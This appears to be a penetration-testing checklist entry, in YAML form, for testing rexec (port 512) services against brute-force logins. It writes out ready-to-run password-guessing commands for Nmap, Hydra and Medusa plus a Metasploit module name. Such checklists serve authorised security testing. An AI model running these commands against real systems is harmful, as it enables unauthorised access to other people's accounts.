---
testcase: Brute Force Authentication - Verify user enumeration and password guessing by running; Nmap brute script (nmap -p 512 --script rexec-brute --script-args "userdb=users.txt,passdb=rockyou.txt" <target>), Hydra (hydra -L users.txt -P passwords.txt rexec://<target> -s 512), Medusa (medusa -h <target> -U users.txt -P passwords.txt -M REXEC), Metasploit (auxiliary/scanner/rservices/rexec_login), all attempting Rexec logins with credential lists
platforms: 
  - Network
methodology: 
  - BlackBox
  - GreyBox
services:
  - REXEC
references:
  - https://book.hacktricks.wiki/en/network-services-pentesting/512-pentesting-rexec.html
---
